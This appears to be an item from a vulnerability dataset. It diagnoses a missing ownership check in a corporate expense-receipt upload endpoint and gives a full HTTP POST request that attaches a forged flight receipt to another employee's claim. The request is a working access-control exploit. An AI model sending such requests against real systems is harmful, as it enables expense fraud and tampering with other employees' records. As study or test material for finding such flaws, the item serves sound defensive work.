diagnosis: The endpoint uploads corporate expense receipt images to S3 and inserts metadata records referencing claimId from the URL path. It fails to check if the expense claim belongs to the logged-in employee (req.user.employeeId). An employee can upload forged hotel or travel receipts to another employee's claim.
exploit_request:
POST /expenses/exp_claim_99182/receipts HTTP/1.1
Host: finance.workforce.com
Authorization: Bearer <employee_token>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC

------WebKitFormBoundaryABC
Content-Disposition: form-data; name="receipt"; filename="bogus_flight_receipt.pdf"
Content-Type: application/pdf

%PDF-1.5...
------WebKitFormBoundaryABC--
